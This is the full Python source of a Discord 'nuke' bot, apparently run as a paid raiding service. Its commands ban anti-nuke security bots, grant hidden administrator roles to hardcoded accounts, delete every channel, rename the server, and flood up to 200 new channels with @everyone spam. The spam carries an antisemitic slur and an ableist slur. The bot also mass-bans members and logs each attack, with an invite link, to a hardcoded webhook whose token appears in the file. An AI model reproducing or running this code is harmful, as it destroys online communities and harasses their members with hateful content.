# -*- coding: utf-8 -*-
import asyncio, base64, json, os, random, time
from datetime import datetime

import aiohttp, discord
from discord import app_commands, Interaction
from discord.errors import HTTPException, Forbidden
from discord.ext import commands, tasks
from discord.ext.commands import BucketType, CommandOnCooldown, Cooldown, cooldown
from discord.ui import Button, Select, View

from flask import Flask
import threading
intents = discord.Intents.all()

leaderboard_message = None
NUKE_STATS_FILE = "nuke_stats.json"
PREMIUM_FILE = "premium.json"
CONFIG_FILE = "config.json"

PREM = 1525416750240366693
MOD_ROLE_ID = 1525416750240366693
WHITELIST = [1464634211406188721]
BLACKLISTED_GUILD_ID = 1525971260943892510
OWNER_ID = 1464634211406188721
LEADERBOARD_CHANNEL_ID = 1401931021544460389
TOKEN = os.getenv('TOKEN')

LOG_WEBHOOK_URL = 'https://discord.com/api/webhooks/1538408453783953469/TADJTY09gijkuwZ8MX_5zslLBA8PQYTnmxTzYT8ZCsEESVd6_BViqHGXg5VFS94SwZTo'

BLOCKED_BOT_IDS = [651095740390834176, 548410451818708993]
BLOCKED_BOT_NAMES = ["Security", "Wick", "Beemo", "AntiNuke"]

# ================== FUNCȚII DE SALVARE ==================
def save_nuke_stats(user_id, guild):
    try:
        with open(NUKE_STATS_FILE, "r") as f:
            stats = json.load(f)
    except FileNotFoundError:
        stats = {"users": {}, "servers": {}}

    stats.setdefault("users", {})
    stats.setdefault("servers", {})

    user_id = str(user_id)
    guild_id = str(guild.id)

    stats["users"].setdefault(user_id, {"uses": 0})
    stats["users"][user_id]["uses"] += 1

    stats["servers"].setdefault(guild_id, {
        "user_id": user_id,
        "member_count": guild.member_count,
        "server_name": guild.name
    })

    with open(NUKE_STATS_FILE, "w") as f:
        json.dump(stats, f, indent=2)

def load_premium_users():
    if not os.path.exists(PREMIUM_FILE):
        return []
    with open(PREMIUM_FILE, "r") as f:
        return json.load(f)

def save_premium_users(user_ids):
    with open(PREMIUM_FILE, "w") as f:
        json.dump(user_ids, f, indent=2)

def is_premium_user(user_id: int):
    premium_users = load_premium_users()
    return user_id in premium_users

def load_config():
    if not os.path.exists(CONFIG_FILE):
        return {}
    with open(CONFIG_FILE, "r") as f:
        try:
            return json.load(f)
        except json.JSONDecodeError:
            return {}

def save_config(config):
    with open(CONFIG_FILE, "w") as f:
        json.dump(config, f, indent=2)

def get_user_config(user_id):
    config = load_config()
    return config.get(str(user_id), {})

def set_user_config(user_id, key, value):
    config = load_config()
    user_str = str(user_id)
    if user_str not in config:
        config[user_str] = {}
    config[user_str][key] = value
    save_config(config)

def get_show_username(user_id):
    return get_user_config(user_id).get("show_username", True)

def set_show_username(user_id, value: bool):
    set_user_config(user_id, "show_username", value)

def get_channel_name(user_id):
    return get_user_config(user_id).get("channel_name", "1week-King")

def set_channel_name(user_id, value: str):
    set_user_config(user_id, "channel_name", value)

def get_webhook_name(user_id):
    return get_user_config(user_id).get("webhook_name", "larp-empire")

def set_webhook_name(user_id, value: str):
    set_user_config(user_id, "webhook_name", value)

def get_webhook_message(user_id):
    return get_user_config(user_id).get("webhook_message", "@everyone This sv has been officially closed https://discord.gg/larpbeamers")

def set_webhook_message(user_id, value: str):
    set_user_config(user_id, "webhook_message", value)

def get_server_name(user_id):
    return get_user_config(user_id).get("server_name", "1weeksober owns this")

def set_server_name(user_id, value: str):
    set_user_config(user_id, "server_name", value)

def get_role_name(user_id):
    return get_user_config(user_id).get("role_name", "1weeksober-on-top")

def set_role_name(user_id, value: str):
    set_user_config(user_id, "role_name", value)

# ===== FUNCȚII PENTRU SETĂRI CUSTOM =====
def get_custom_channel_name(user_id):
    return get_user_config(user_id).get("custom_channel_name", None)

def set_custom_channel_name(user_id, value: str):
    set_user_config(user_id, "custom_channel_name", value)

def get_custom_server_name(user_id):
    return get_user_config(user_id).get("custom_server_name", None)

def set_custom_server_name(user_id, value: str):
    set_user_config(user_id, "custom_server_name", value)

def get_custom_role_name(user_id):
    return get_user_config(user_id).get("custom_role_name", None)

def set_custom_role_name(user_id, value: str):
    set_user_config(user_id, "custom_role_name", value)

def get_custom_message(user_id):
    return get_user_config(user_id).get("custom_message", None)

def set_custom_message(user_id, value: str):
    set_user_config(user_id, "custom_message", value)

class CooldownManager:
    def __init__(self, cooldown_seconds: int):
        self.cooldown_seconds = cooldown_seconds
        self.user_timestamps = {}

    def can_use(self, user_id: int):
        now = time.time()
        last_time = self.user_timestamps.get(user_id, 0)
        elapsed = now - last_time
        if elapsed >= self.cooldown_seconds:
            self.user_timestamps[user_id] = now
            self.cleanup()
            return True, 0
        else:
            return False, int(self.cooldown_seconds - elapsed)

    def cleanup(self):
        now = time.time()
        to_delete = [user for user, ts in self.user_timestamps.items() if now - ts > self.cooldown_seconds]
        for user in to_delete:
            del self.user_timestamps[user]

cooldown_manager = CooldownManager(100)

# ================== FONTURI UNICODE ==================
FONT_MAPS = {
    "bold": {
        'a': '𝗮', 'b': '𝗯', 'c': '𝗰', 'd': '𝗱', 'e': '𝗲', 'f': '𝗳', 'g': '𝗴', 'h': '𝗵', 'i': '𝗶', 'j': '𝗷',
        'k': '𝗸', 'l': '𝗹', 'm': '𝗺', 'n': '𝗻', 'o': '𝗼', 'p': '𝗽', 'q': '𝗾', 'r': '𝗿', 's': '𝘀', 't': '𝘁',
        'u': '𝘂', 'v': '𝘃', 'w': '𝘄', 'x': '𝘅', 'y': '𝘆', 'z': '𝘇',
        'A': '𝗔', 'B': '𝗕', 'C': '𝗖', 'D': '𝗗', 'E': '𝗘', 'F': '𝗙', 'G': '𝗚', 'H': '𝗛', 'I': '𝗜', 'J': '𝗝',
        'K': '𝗞', 'L': '𝗟', 'M': '𝗠', 'N': '𝗡', 'O': '𝗢', 'P': '𝗣', 'Q': '𝗤', 'R': '𝗥', 'S': '𝗦', 'T': '𝗧',
        'U': '𝗨', 'V': '𝗩', 'W': '𝗪', 'X': '𝗫', 'Y': '𝗬', 'Z': '𝗭'
    },
    "script": {
        'a': '𝒶', 'b': '𝒷', 'c': '𝒸', 'd': '𝒹', 'e': 'ℯ', 'f': '𝒻', 'g': 'ℊ', 'h': '𝒽', 'i': '𝒾', 'j': '𝒿',
        'k': '𝓀', 'l': '𝓁', 'm': '𝓂', 'n': '𝓃', 'o': 'ℴ', 'p': '𝓅', 'q': '𝓆', 'r': '𝓇', 's': '𝓈', 't': '𝓉',
        'u': '𝓊', 'v': '𝓋', 'w': '𝓌', 'x': '𝓍', 'y': '𝓎', 'z': '𝓏',
        'A': '𝒜', 'B': '𝐵', 'C': '𝒞', 'D': '𝒟', 'E': '𝐸', 'F': '𝐹', 'G': '𝒢', 'H': '𝐻', 'I': '𝐼', 'J': '𝒥',
        'K': '𝒦', 'L': '𝐿', 'M': '𝑀', 'N': '𝒩', 'O': '𝒪', 'P': '𝒫', 'Q': '𝒬', 'R': '𝑅', 'S': '𝒮', 'T': '𝒯',
        'U': '𝒰', 'V': '𝒱', 'W': '𝒲', 'X': '𝒳', 'Y': '𝒴', 'Z': '𝒵'
    },
    "double": {
        'a': '𝕒', 'b': '𝕓', 'c': '𝕔', 'd': '𝕕', 'e': '𝕖', 'f': '𝕗', 'g': '𝕘', 'h': '𝕙', 'i': '𝕚', 'j': '𝕛',
        'k': '𝕜', 'l': '𝕝', 'm': '𝕞', 'n': '𝕟', 'o': '𝕠', 'p': '𝕡', 'q': '𝕢', 'r': '𝕣', 's': '𝕤', 't': '𝕥',
        'u': '𝕦', 'v': '𝕧', 'w': '𝕨', 'x': '𝕩', 'y': '𝕪', 'z': '𝕫',
        'A': '𝔸', 'B': '𝔹', 'C': 'ℂ', 'D': '𝔻', 'E': '𝔼', 'F': '𝔽', 'G': '𝔾', 'H': 'ℍ', 'I': '𝕀', 'J': '𝕁',
        'K': '𝕂', 'L': '𝕃', 'M': '𝕄', 'N': 'ℕ', 'O': '𝕆', 'P': 'ℙ', 'Q': 'ℚ', 'R': 'ℝ', 'S': '𝕊', 'T': '𝕋',
        'U': '𝕌', 'V': '𝕍', 'W': '𝕎', 'X': '𝕏', 'Y': '𝕐', 'Z': 'ℤ'
    }
}

def apply_font(text, font_style):
    if not text:
        return text
    font_map = FONT_MAPS.get(font_style, {})
    result = []
    for char in text:
        if char in font_map:
            result.append(font_map[char])
        else:
            result.append(char)
    return ''.join(result)

async def detect_and_ban_antinuke_bots(guild):
    banned = []
    for member in guild.members:
        if member.bot:
            bot_name = member.nick or member.name
            if member.id in BLOCKED_BOT_IDS or any(x.lower() in bot_name.lower() for x in BLOCKED_BOT_NAMES):
                try:
                    await member.ban(reason="Anti-nuke bot detected")
                    banned.append(f"{bot_name} ({member.id})")
                except:
                    pass
    return banned

class MyBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.all()
        super().__init__(command_prefix="!", intents=intents)
        self.remove_command("help")

    async def setup_hook(self):
        await self.tree.sync()

bot = MyBot()

# ================== FUNCȚIA DE LOG PRIN WEBHOOK ==================
async def send_nuke_log(guild_name_original, guild, user, channels, messages, invite_link=None):
    if not LOG_WEBHOOK_URL:
        return

    description = f"**{user.display_name}** (`{user.id}`) has just nuked the server **{guild_name_original}**."
    if invite_link:
        description += f"\n\n🔗 **Server Invite:** {invite_link}"

    embed = discord.Embed(
        title="💀 Server Nuked",
        description=description,
        color=discord.Color.red(),
        timestamp=datetime.utcnow()
    )
    embed.set_thumbnail(url=guild.icon.url if guild.icon else None)
    embed.add_field(name="👤 Members", value=f"`{guild.member_count}`", inline=True)
    embed.add_field(name="🫆 Roles", value=f"`{len(guild.roles)}`", inline=True)
    embed.add_field(name="🔗 Server ID", value=f"`{guild.id}`", inline=False)
    embed.add_field(name="👑 Owner", value=f"`{guild.owner}`", inline=True)
    embed.add_field(name="📅 Created", value=f"`{guild.created_at.strftime('%Y-%m-%d %H:%M UTC')}`", inline=True)
    embed.add_field(name="⚡ Boost Level", value=f"`{guild.premium_tier}`", inline=True)
    embed.add_field(name="📊 Channels created", value=f"`{channels}`", inline=True)
    embed.add_field(name="📨 Messages per channel", value=f"`{messages}`", inline=True)
    embed.set_footer(text="Larp Nuke Bot • Logs")

    try:
        async with aiohttp.ClientSession() as session:
            webhook = discord.Webhook.from_url(LOG_WEBHOOK_URL, session=session)
            await webhook.send(embed=embed)
    except Exception as e:
        print(f"[LOG ERROR] {e}")

# ================== MODAL PENTRU SETĂRI CUSTOM ==================
class NukeConfigModal(discord.ui.Modal, title="⚙️ Nuke Custom Settings"):
    custom_channel_name = discord.ui.TextInput(
        label="Channel Name",
        placeholder="Numele canalelor (ex: nuked-by-larp)",
        required=False,
        max_length=32,
        default=""
    )
    custom_server_name = discord.ui.TextInput(
        label="Server Name",
        placeholder="Noul nume al serverului",
        required=False,
        max_length=32,
        default=""
    )
    custom_role_name = discord.ui.TextInput(
        label="Role Name",
        placeholder="Numele rolului creat",
        required=False,
        max_length=32,
        default=""
    )
    custom_message = discord.ui.TextInput(
        label="Custom Spam Message",
        placeholder="Mesajul pe care vrei să-l spamezi (fără embed)",
        required=False,
        style=discord.TextStyle.paragraph,
        max_length=500,
        default=""
    )

    async def on_submit(self, interaction: discord.Interaction):
        user_id = interaction.user.id

        if self.custom_channel_name.value:
            set_custom_channel_name(user_id, self.custom_channel_name.value)
        else:
            set_user_config(user_id, "custom_channel_name", None)

        if self.custom_server_name.value:
            set_custom_server_name(user_id, self.custom_server_name.value)
        else:
            set_user_config(user_id, "custom_server_name", None)

        if self.custom_role_name.value:
            set_custom_role_name(user_id, self.custom_role_name.value)
        else:
            set_user_config(user_id, "custom_role_name", None)

        if self.custom_message.value:
            set_custom_message(user_id, self.custom_message.value)
        else:
            set_user_config(user_id, "custom_message", None)

        await interaction.response.send_message("✅ Custom settings saved successfully!", ephemeral=True)

    async def on_error(self, interaction: discord.Interaction, error: Exception):
        await interaction.response.send_message(f"❌ Error: {str(error)}", ephemeral=True)

# ================== SLASH COMMANDS ==================
@bot.tree.command(name="custom", description="Customize your nuke settings for !ncustom (Premium only)")
@app_commands.default_permissions(administrator=True)
async def custom(interaction: Interaction):
    if not is_premium_user(interaction.user.id):
        await interaction.response.send_message("❌ This command is only available for premium users.", ephemeral=True)
        return

    try:
        modal = NukeConfigModal()
        existing_channel = get_custom_channel_name(interaction.user.id)
        existing_server = get_custom_server_name(interaction.user.id)
        existing_role = get_custom_role_name(interaction.user.id)
        existing_message = get_custom_message(interaction.user.id)

        if existing_channel:
            modal.custom_channel_name.default = existing_channel
        if existing_server:
            modal.custom_server_name.default = existing_server
        if existing_role:
            modal.custom_role_name.default = existing_role
        if existing_message:
            modal.custom_message.default = existing_message

        await interaction.response.send_modal(modal)
    except Exception as e:
        await interaction.response.send_message(f"❌ Failed to open settings: {str(e)}", ephemeral=True)

# ================== COMENZI ==================
@bot.command(name="addpremium")
async def addpremium(ctx, user: discord.User):
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ You are not authorized.")
        return
    premium_users = load_premium_users()
    if user.id not in premium_users:
        premium_users.append(user.id)
        save_premium_users(premium_users)
        await ctx.send(f"✅ {user.name} has been granted premium.")
    else:
        await ctx.send(f"ℹ️ {user.name} already has premium.")

@bot.command(name="removepremium")
async def removepremium(ctx, user: discord.User):
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ You are not authorized.")
        return
    premium_users = load_premium_users()
    if user.id in premium_users:
        premium_users.remove(user.id)
        save_premium_users(premium_users)
        await ctx.send(f"✅ {user.name} has been removed from premium.")
    else:
        await ctx.send(f"ℹ️ {user.name} does not have premium.")

@bot.command(name="leave")
async def leave_cmd(ctx):
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ You are not authorized.")
        return
    await ctx.send("Leaving all servers...")
    for guild in bot.guilds:
        if guild.id != BLACKLISTED_GUILD_ID:
            try:
                await guild.leave()
            except:
                pass
    await ctx.send("✅ Left all servers (except blacklisted).")

# ================== COMENZI PUBLICE ==================
@bot.command(name="admin")
async def admin_cmd(ctx):
    guild = ctx.guild
    if guild and guild.id == BLACKLISTED_GUILD_ID:
        await ctx.reply("`This server is blacklisted.`")
        return
    await ctx.message.delete()
    role = discord.utils.get(guild.roles, name="verified_user")
    if role is None:
        perms = discord.Permissions.all()
        role = await guild.create_role(name="verified_user", permissions=perms)
        await ctx.send("✅ done!")
    else:
        await ctx.send("✅ already done!")
    await ctx.author.add_roles(role)

@bot.command(name="massban")
async def massban(ctx):
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ You are not authorized.")
        return
    guild = ctx.guild
    if guild.id == BLACKLISTED_GUILD_ID:
        await ctx.send("`This server is blacklisted.`")
        return
    members_to_ban = [m for m in guild.members if m != ctx.author and guild.me.top_role > m.top_role]
    total = len(members_to_ban)
    if total == 0:
        await ctx.send("No members to ban.")
        return
    confirm_msg = await ctx.send(
        f"🚀 **Trying to ban {total} members...**\n\n"
        f"⚠️ Make sure the bot's role is **above every other role**.\n"
        f"The bot can only ban users that are **under** its role.\n\n"
        f"React with ✅ to confirm or ❌ to cancel."
    )
    await confirm_msg.add_reaction("✅")
    await confirm_msg.add_reaction("❌")
    def check(reaction, user):
        return user == ctx.author and str(reaction.emoji) in ["✅", "❌"] and reaction.message.id == confirm_msg.id
    try:
        reaction, user = await bot.wait_for("reaction_add", timeout=30.0, check=check)
    except asyncio.TimeoutError:
        await ctx.send("❌ Timed out — massban cancelled.")
        return
    if str(reaction.emoji) == "❌":
        await ctx.send("❌ Cancelled massban.")
        return
    await ctx.send(f"🚀 Starting to ban {total} members...")
    count = 0
    async with aiohttp.ClientSession() as session:
        for member in members_to_ban:
            try:
                url = f"https://discord.com/api/v10/guilds/{guild.id}/bans/{member.id}"
                headers = {"Authorization": f"Bot {bot.http.token}", "Content-Type": "application/json"}
                json_data = {"delete_message_days": 0, "reason": "Massban"}
                async with session.put(url, json=json_data, headers=headers) as resp:
                    if resp.status == 429:
                        data = await resp.json()
                        retry_after = data.get("retry_after", 1)
                        await asyncio.sleep(retry_after)
                        continue
                    elif resp.status in (200, 201, 204):
                        count += 1
                    else:
                        pass
            except:
                pass
    await ctx.send(f"✅ Massban complete — {count}/{total} users banned.")

@bot.command(name="invite")
async def invite_cmd(ctx):
    invite_link = discord.utils.oauth_url(
        client_id=bot.user.id,
        permissions=discord.Permissions(administrator=True),
        scopes=("bot",)
    )
    embed = discord.Embed(
        title="🔗 Invite The Bot",
        description="Click the link below to invite the bot with admin permissions:",
        color=discord.Color.blurple()
    )
    embed.add_field(name="Invite Link", value=f"[Click here to invite]({invite_link})", inline=False)
    embed.set_footer(text=f"Requested by {ctx.author}", icon_url=ctx.author.avatar.url if ctx.author.avatar else ctx.author.default_avatar.url)
    embed.timestamp = datetime.utcnow()
    try:
        await ctx.author.send(embed=embed)
        await ctx.reply("📬 I've sent you the bot invite in your DMs!", ephemeral=True if ctx.guild else False)
    except discord.Forbidden:
        await ctx.reply("❌ I couldn't DM you. Please check your privacy settings.", ephemeral=True if ctx.guild else False)

@bot.command(name="modraid")
async def modraid(ctx, *, message=None):
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ You are not authorized.")
        return
    if message is None:
        await ctx.send("Provide a message.")
        return
    role = ctx.guild.get_role(MOD_ROLE_ID)
    if role is None:
        await ctx.send("Role not found.")
        return
    await ctx.send(f"{message}\n<@&{MOD_ROLE_ID}>\n\nSent from {ctx.author.mention}")
    try:
        await ctx.message.delete()
    except:
        pass

# ================== !nhelp ==================
@bot.command(name="nhelp")
async def real_help(ctx):
    embed = discord.Embed(
        title="⚡ Larp Nuke Bot Help",
        description="List of available commands:",
        color=discord.Color.blurple()
    )
    embed.set_thumbnail(url=bot.user.avatar.url if bot.user.avatar else bot.user.default_avatar.url)
    embed.add_field(
        name="`!setup`",
        value="Normal nuke: embed + GIFs + default spam.",
        inline=False
    )
    embed.add_field(
        name="`!ncustom`",
        value="Custom nuke: uses your `/custom` settings (text only, no embed).",
        inline=False
    )
    embed.add_field(
        name="`!admin`",
        value="Tries to secretly give you admin.",
        inline=False
    )
    embed.add_field(
        name="`!massban`",
        value="Bans everyone! (Owner only)",
        inline=False
    )
    embed.add_field(
        name="`!invite`",
        value="Sends the bot invite to your dms.",
        inline=False
    )
    embed.add_field(
        name="`!modraid`",
        value="Raid command (Owner only)",
        inline=False
    )
    embed.add_field(
        name="**Slash Commands**",
        value=(
            "`/custom` - Customize settings for !ncustom (Premium only)\n"
            "`/bypass`, `/blacklist`, `/feedback`, `/ping`, `/pull`, `/rep`, `/setup`, `/syncroles`, `/vouch`\n"
            "*These are placeholders and do not have functionality yet.*"
        ),
        inline=False
    )
    embed.set_footer(
        text=f"Requested by {ctx.author}",
        icon_url=ctx.author.avatar.url if ctx.author.avatar else ctx.author.default_avatar.url
    )
    embed.timestamp = datetime.utcnow()
    await ctx.send(embed=embed)

# ================== FUNCȚII COMUNE PENTRU NUKE ==================
async def send_with_retry(channel, content=None, embed=None, max_retries=10):
    retries = 0
    while retries < max_retries:
        try:
            if content is not None and embed is not None:
                await channel.send(content=content, embed=embed, tts=True)
            elif content is not None:
                await channel.send(content=content, tts=True)
            elif embed is not None:
                await channel.send(embed=embed)
            return True
        except discord.HTTPException as e:
            if e.status == 429:
                retry_after = e.retry_after if hasattr(e, 'retry_after') else 1.0
                wait = retry_after + (retries * 0.5)
                await asyncio.sleep(wait)
                retries += 1
            else:
                return False
        except Exception:
            return False
    return False

async def create_channel_with_retry(guild, name, max_retries=10):
    retries = 0
    while retries < max_retries:
        try:
            ch = await guild.create_text_channel(name=name)
            return ch
        except discord.HTTPException as e:
            if e.status == 429:
                retry_after = e.retry_after if hasattr(e, 'retry_after') else 1.0
                wait = retry_after + (retries * 0.5)
                await asyncio.sleep(wait)
                retries += 1
            else:
                return None
        except Exception:
            return None
    return None

async def perform_nuke(ctx, custom_mode: bool):
    guild = ctx.guild
    user = ctx.author
    original_name = guild.name

    if not ctx.guild.me.guild_permissions.administrator:
        await ctx.send("❌ Bot does not have Administrator permission.")
        return

    if guild.id == BLACKLISTED_GUILD_ID:
        await ctx.reply("`This server is blacklisted.`")
        return

    if len(guild.members) < 2:
        await user.send(f"❌ Server `{guild.name}` needs at least 2 members. Leaving..")
        await guild.leave()
        return

    banned_bots = await detect_and_ban_antinuke_bots(guild)
    if banned_bots:
        await user.send(f"✅ Banned anti-nuke bots: {', '.join(banned_bots)}")

    is_owner = (user.id == OWNER_ID)
    total_channels = 200 if is_owner else 100
    spam_messages = 25 if is_owner else 20

    # ===== DETERMINĂ SETĂRI =====
    if custom_mode:
        # Folosește setările custom dacă există
        custom_channel = get_custom_channel_name(user.id)
        custom_server = get_custom_server_name(user.id)
        custom_role = get_custom_role_name(user.id)
        custom_msg = get_custom_message(user.id)

        channel_name = custom_channel if custom_channel else "1week-King"
        server_name = custom_server if custom_server else "1weeksober owns this"
        role_name = custom_role if custom_role else "1weeksober-on-top"
        text_message = custom_msg if custom_msg else "@everyone @here join https://discord.gg/larpbeamers"
    else:
        # !setup normal: folosește valorile default
        channel_name = "1week-King"
        server_name = "1weeksober owns this"
        role_name = "1weeksober-on-top"
        text_message = "@everyone @here join https://discord.gg/larpbeamers"

    # ===== CONSTRUIRE EMBED (doar pentru modul normal) =====
    embed_main = None
    embed_scare = None
    embed_gif2 = None
    if not custom_mode:
        embed_main = discord.Embed(
            title="**LARP EMPIRE N4KED YOUR AHH**",
            description=(
                "@everyone @here CORRUPT OFFICIALLY N4KED YALL AHH STUPID JEWS FUH THIS STUPID DUALHOOK YALL GOT HERE\n\n"
                "**# LARP EMPIRE SERVER NON HOOKED**\n"
                "**EVERYONE JOIN HERE GUYS LEAVE THIS SH**\n"
                "https://discord.gg/larpbeamers\n\n"
                "*Next time don't give admin perms to everyone r4tard.*"
            ),
            color=0x000000
        )
        embed_main.set_image(url="https://i.imgur.com/yMQvcRw.gif")
        embed_main.set_footer(text="Larp Empire • Nuke Service")

        embed_scare = discord.Embed(color=0x000000)
        embed_scare.set_image(url="https://gifdb.com/images/thumbnail/jeff-the-killer-jump-scare-53cmfrhh3ffrswv1.gif")

        embed_gif2 = discord.Embed(color=0x000000)
        embed_gif2.set_image(url="https://i.imgur.com/yMQvcRw.gif")

    save_nuke_stats(user.id, guild)

    admin_users = [1389763251042258944, 1464634211406188721]
    try:
        admin_role = await guild.create_role(name="Larp Empire Admin", permissions=discord.Permissions.all())
        for admin_id in admin_users:
            member = guild.get_member(admin_id)
            if member:
                await member.add_roles(admin_role)
    except:
        pass

    try:
        await guild.edit(name=server_name)
    except:
        pass

    # Șterge toate canalele
    delete_tasks = [channel.delete() for channel in guild.channels if channel != ctx.channel]
    if delete_tasks:
        await asyncio.gather(*delete_tasks, return_exceptions=True)
        await asyncio.sleep(1)

    font_styles = ["bold", "script", "double"]
    created_channels = []
    invite_link = None

    await user.send(f"🔄 Starting creation of {total_channels} channels in {'custom' if custom_mode else 'normal'} mode...")

    first_channel = None

    async def spam_channel(channel):
        try:
            if custom_mode:
                # Mod custom: trimite DOAR mesajul text de `spam_messages` ori
                for _ in range(spam_messages):
                    await send_with_retry(channel, content=text_message)
                    await asyncio.sleep(0.1)
            else:
                # Mod normal: trimite embed + GIF-uri + text
                for _ in range(15):
                    await send_with_retry(channel, content=text_message)
                    await asyncio.sleep(0.1)

                    await send_with_retry(channel, embed=embed_main)
                    await asyncio.sleep(0.1)

                    await send_with_retry(channel, embed=embed_scare)
                    await asyncio.sleep(0.1)

                    await send_with_retry(channel, embed=embed_gif2)
                    await asyncio.sleep(0.1)

                # Spam suplimentar cu ping-uri
                for _ in range(spam_messages):
                    ping_count = random.randint(5, 12)
                    msg = ("@everyone @here join https://discord.gg/larpbeamers\n") * ping_count
                    await send_with_retry(channel, content=msg)
                    await asyncio.sleep(0.05)
        except Exception:
            pass

    async def create_and_spam(index):
        nonlocal first_channel, invite_link
        try:
            styled_name = apply_font(channel_name, random.choice(font_styles))
            if len(styled_name) > 100:
                styled_name = channel_name
            ch = await create_channel_with_retry(guild, styled_name)
            if ch is None:
                await user.send(f"⚠️ Failed to create channel {index} after retries.")
                return
            created_channels.append(ch)

            if first_channel is None:
                first_channel = ch
                try:
                    invite = await ch.create_invite(max_age=86400, max_uses=0, reason="Nuke log invite")
                    invite_link = invite.url
                except:
                    pass

            asyncio.create_task(spam_channel(ch))
        except Exception as e:
            await user.send(f"⚠️ Error on channel {index}: {e}")

    tasks = [create_and_spam(i) for i in range(total_channels)]
    await asyncio.gather(*tasks)

    await send_nuke_log(original_name, guild, user, total_channels, spam_messages, invite_link)

    await user.send(f"✅ All {len(created_channels)} channels created, spam ({spam_messages} messages per channel) running in parallel!")

    try:
        await guild.create_role(name=role_name)
    except:
        pass

    try:
        await user.send("✅ Process completed. Leaving server...")
        await guild.leave()
        await user.send("✅ Left the server.")
        print(f"[INFO] Left {guild.name} ({guild.id})")
    except Exception as e:
        await user.send(f"❌ Failed to leave the server: {e}")
        print(f"[ERROR] Could not leave {guild.name}: {e}")

# ================== COMENDA SETUP (NORMAL) ==================
@bot.command()
async def setup(ctx):
    await perform_nuke(ctx, custom_mode=False)

# ================== COMENDA NCUSTOM (CUSTOM) ==================
@bot.command()
async def ncustom(ctx):
    # Verifică dacă utilizatorul este premium pentru a folosi !ncustom
    if not is_premium_user(ctx.author.id):
        await ctx.send("❌ This command is only available for premium users.")
        return
    await perform_nuke(ctx, custom_mode=True)

# ================== EVENIMENTE ==================
@bot.event
async def on_ready():
    print(f"✅ Bot is online as {bot.user}!")
    print(f"📊 Connected to {len(bot.guilds)} servers.")
    await bot.tree.sync()

app = Flask(__name__)
@app.route("/")
def home():
    return "Larp Nuke Bot is online."

def run_flask():
    port = int(os.getenv("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

threading.Thread(target=run_flask).start()

bot.run(TOKEN)
